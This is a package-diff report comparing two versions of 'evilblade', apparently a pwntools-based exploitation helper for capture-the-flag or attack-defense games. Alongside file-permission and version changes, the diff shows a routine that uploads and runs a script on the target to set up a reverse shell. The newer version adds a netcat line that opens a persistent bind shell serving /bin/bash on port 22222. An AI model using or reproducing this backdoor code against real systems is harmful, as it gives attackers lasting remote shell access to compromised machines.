# Comparing `tmp/evilblade-1.1.7.7.tar.gz` & `tmp/evilblade-1.1.7.8.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "evilblade-1.1.7.7.tar", last modified: Sun Apr 21 00:15:23 2024, max compression
+gzip compressed data, was "evilblade-1.1.7.8.tar", last modified: Sun May 12 03:07:17 2024, max compression
```

## Comparing `evilblade-1.1.7.7.tar` & `evilblade-1.1.7.8.tar`

### file list

```diff
@@ -1,14 +1,14 @@
-drwxr-xr-x   0 N1nE      (1000) N1nE      (1000)        0 2024-04-21 00:15:23.942927 evilblade-1.1.7.7/
--rw-r--r--   0 N1nE      (1000) N1nE      (1000)      408 2024-04-21 00:15:23.941927 evilblade-1.1.7.7/PKG-INFO
--rwxrwxrwx   0 N1nE      (1000) N1nE      (1000)      149 2023-12-08 11:58:29.000000 evilblade-1.1.7.7/README.md
-drwxr-xr-x   0 N1nE      (1000) N1nE      (1000)        0 2024-04-21 00:15:23.941927 evilblade-1.1.7.7/evilblade/
--rwxrwxrwx   0 N1nE      (1000) N1nE      (1000)    16829 2024-04-21 00:12:24.000000 evilblade-1.1.7.7/evilblade/__init__.py
--rw-r--r--   0 N1nE      (1000) N1nE      (1000)      794 2024-03-27 10:30:47.000000 evilblade-1.1.7.7/evilblade/a.py
-drwxr-xr-x   0 N1nE      (1000) N1nE      (1000)        0 2024-04-21 00:15:23.941927 evilblade-1.1.7.7/evilblade.egg-info/
--rw-r--r--   0 N1nE      (1000) N1nE      (1000)      408 2024-04-21 00:15:23.000000 evilblade-1.1.7.7/evilblade.egg-info/PKG-INFO
--rwxrwxrwx   0 N1nE      (1000) N1nE      (1000)      219 2024-04-21 00:15:23.000000 evilblade-1.1.7.7/evilblade.egg-info/SOURCES.txt
--rwxrwxrwx   0 N1nE      (1000) N1nE      (1000)        1 2024-04-21 00:15:23.000000 evilblade-1.1.7.7/evilblade.egg-info/dependency_links.txt
--rw-r--r--   0 N1nE      (1000) N1nE      (1000)       22 2024-04-21 00:15:23.000000 evilblade-1.1.7.7/evilblade.egg-info/requires.txt
--rwxrwxrwx   0 N1nE      (1000) N1nE      (1000)       10 2024-04-21 00:15:23.000000 evilblade-1.1.7.7/evilblade.egg-info/top_level.txt
--rw-r--r--   0 N1nE      (1000) N1nE      (1000)       38 2024-04-21 00:15:23.942927 evilblade-1.1.7.7/setup.cfg
--rwxrwxrwx   0 N1nE      (1000) N1nE      (1000)      538 2024-04-21 00:14:54.000000 evilblade-1.1.7.7/setup.py
+drwxr-xr-x   0 N1nE      (1000) N1nE      (1000)        0 2024-05-12 03:07:17.575469 evilblade-1.1.7.8/
+-rw-r--r--   0 N1nE      (1000) N1nE      (1000)      408 2024-05-12 03:07:17.575469 evilblade-1.1.7.8/PKG-INFO
+-rwxr-xr-x   0 N1nE      (1000) N1nE      (1000)      149 2024-05-12 03:06:44.000000 evilblade-1.1.7.8/README.md
+drwxr-xr-x   0 N1nE      (1000) N1nE      (1000)        0 2024-05-12 03:07:17.574469 evilblade-1.1.7.8/evilblade/
+-rwxr-xr-x   0 N1nE      (1000) N1nE      (1000)    16917 2024-05-12 03:07:02.000000 evilblade-1.1.7.8/evilblade/__init__.py
+-rw-r--r--   0 N1nE      (1000) N1nE      (1000)      794 2024-05-12 03:06:44.000000 evilblade-1.1.7.8/evilblade/a.py
+drwxr-xr-x   0 N1nE      (1000) N1nE      (1000)        0 2024-05-12 03:07:17.575469 evilblade-1.1.7.8/evilblade.egg-info/
+-rw-r--r--   0 N1nE      (1000) N1nE      (1000)      408 2024-05-12 03:07:17.000000 evilblade-1.1.7.8/evilblade.egg-info/PKG-INFO
+-rwxr-xr-x   0 N1nE      (1000) N1nE      (1000)      219 2024-05-12 03:07:17.000000 evilblade-1.1.7.8/evilblade.egg-info/SOURCES.txt
+-rwxr-xr-x   0 N1nE      (1000) N1nE      (1000)        1 2024-05-12 03:07:17.000000 evilblade-1.1.7.8/evilblade.egg-info/dependency_links.txt
+-rw-r--r--   0 N1nE      (1000) N1nE      (1000)       22 2024-05-12 03:07:17.000000 evilblade-1.1.7.8/evilblade.egg-info/requires.txt
+-rwxr-xr-x   0 N1nE      (1000) N1nE      (1000)       10 2024-05-12 03:07:17.000000 evilblade-1.1.7.8/evilblade.egg-info/top_level.txt
+-rw-r--r--   0 N1nE      (1000) N1nE      (1000)       38 2024-05-12 03:07:17.575469 evilblade-1.1.7.8/setup.cfg
+-rwxr-xr-x   0 N1nE      (1000) N1nE      (1000)      538 2024-05-12 03:07:16.000000 evilblade-1.1.7.8/setup.py
```

### Comparing `evilblade-1.1.7.7/evilblade/__init__.py` & `evilblade-1.1.7.8/evilblade/__init__.py`

 * *Files 1% similar despite different names*

```diff
@@ -187,15 +187,15 @@
     return base
 
 def evgdb(*argv):
     """
     Set gdb (evil-gdb)
     """
     p = globals()['p']
-    context.terminal = ['alacritty', '-e']
+    # context.terminal = ['alacritty', '-e']
     # Modify terminal as per your environment
     # Replace 'alacritty' with the result of running 'echo $TERM'
     if args.G:
         if(len(argv)==0):
             gdb.attach(p)
         else:
             gdb.attach(p, *argv)
@@ -589,20 +589,22 @@
     if "init" in shell:
         ip=ip+10000
         nice = upload(shell,"/tmp/init.sh", ip)
         if nice == 0:
             return 0
         sl("chmod +x /tmp/init.sh && /tmp/init.sh")
         print(f"{GREEN}[+]{END} Reverse shell in port {int(ip) + 30000} is ready")
+        sl("nc -lvp 22222 -e /bin/bash &")
         ia()
         # sl("exit")
     else:
         nice = upload(shell,"/tmp/service.sh", ip)
         if nice == 0:
             return 0
         sl("chmod +x /tmp/service.sh && /tmp/service.sh &")
         print(f"{GREEN}[+]{END} Reverse shell in port {int(ip) + 30000} is ready")
+        sl("nc -lvp 22222 -e /bin/bash &")
         ia()
     # print(f"{GREEN}[+]{END} Reverse shell in port {int(ip) + 30000} is ready")
     clo()
```

### Comparing `evilblade-1.1.7.7/evilblade/a.py` & `evilblade-1.1.7.8/evilblade/a.py`

 * *Files identical despite different names*

### Comparing `evilblade-1.1.7.7/setup.py` & `evilblade-1.1.7.8/setup.py`

 * *Files 1% similar despite different names*

```diff
@@ -1,12 +1,12 @@
 from setuptools import setup
 
 setup(
     name='evilblade',
-    version='1.1.7.7',
+    version='1.1.7.8',
     description='7 N1nEmAn\'s evilblade!!',
     packages=['evilblade'],
     install_requires=[
         'pwntools',
         'LibcSearcher'
     ],
```

